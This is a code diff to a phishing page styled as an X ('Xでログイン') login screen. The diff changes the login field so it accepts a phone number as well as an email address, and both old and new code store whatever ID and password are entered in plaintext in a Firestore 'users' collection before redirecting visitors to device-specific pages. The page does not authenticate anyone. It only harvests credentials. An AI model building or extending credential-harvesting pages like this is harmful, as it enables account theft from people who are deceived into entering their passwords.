@@ -60,7 +60,7 @@
 <body>
   <div class="container">
     <h1>Xでログイン</h1>
-    <input type="email" id="email" placeholder="メールアドレス" />
+    <input type="text" id="loginId" placeholder="メールアドレス または 電話番号" />
     <input type="password" id="password" placeholder="パスワード" />
     <button id="loginBtn">ログイン</button>
   </div>
@@ -99,25 +99,40 @@
   }
 
   // ログイン処理
-  document.getElementById('loginBtn').onclick = function() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+document.getElementById('loginBtn').onclick = function() {
+  const loginId = document.getElementById('loginId').value;
+  const password = document.getElementById('password').value;
 
-    if (email && password) {
-      // Firestoreにデータを保存
-      addDoc(collection(db, "users"), {
-        email: email,
-        password: password,
-        timestamp: serverTimestamp()
-      })
+  if (loginId && password) {
+    // メールアドレス形式か電話番号形式かをチェック
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(loginId);
+    const isPhone = /^[0-9]{10,11}$/.test(loginId.replace(/[-\s]/g, ''));
+
+    if (!isEmail && !isPhone) {
+      alert('正しいメールアドレスまたは電話番号を入力してください');
+      return;
+    }
+
+    // 保存するフィールド名を切り替え
+    const userData = {
+      password: password,
+      timestamp: serverTimestamp()
+    };
+    if (isEmail) {
+      userData.email = loginId;
+    } else {
+      userData.phone = loginId.replace(/[-\s]/g, ''); // ハイフン・空白除去
+    }
+
+    addDoc(collection(db, "users"), userData)
       .then(() => {
-        const deviceType = getDeviceType(); // 端末の種類を判定
+        const deviceType = getDeviceType();
         if (deviceType === 'android') {
-          window.location.href = 'android.html'; // Android端末用ページに遷移
+          window.location.href = 'android.html';
         } else if (deviceType === 'iphone') {
-          window.location.href = 'iphone.html'; // iPhone端末用ページに遷移
+          window.location.href = 'iphone.html';
         } else if (deviceType === 'pc') {
-          window.location.href = 'pc.html'; // PC用ページに遷移
+          window.location.href = 'pc.html';
         } else {
           alert('不明な端末です');
         }
@@ -125,10 +140,10 @@
       .catch(error => {
         alert('エラーが発生しました: ' + error);
       });
-    } else {
-      alert('メールアドレスとパスワードを入力してください');
-    }
+  } else {
+    alert('ログインIDとパスワードを入力してください');
   }
+};
 </script>
 
 </body>
